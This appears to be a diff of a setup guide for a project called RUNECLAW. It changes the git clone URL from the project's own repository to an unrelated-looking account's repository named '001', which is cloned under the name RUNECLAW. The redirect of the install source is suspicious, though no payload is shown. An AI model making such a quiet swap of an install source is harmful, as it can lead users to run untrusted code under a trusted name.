@@ -13,7 +13,7 @@ This guide walks you through setting up RUNECLAW from scratch.
 
 ```bash
 # Clone the repository
-git clone https://github.com/Humanoid-Traders/RUNECLAW.git
+git clone https://github.com/metafrogmeme-droid/001.git RUNECLAW
 cd RUNECLAW
 
 # Create and activate a virtual environment
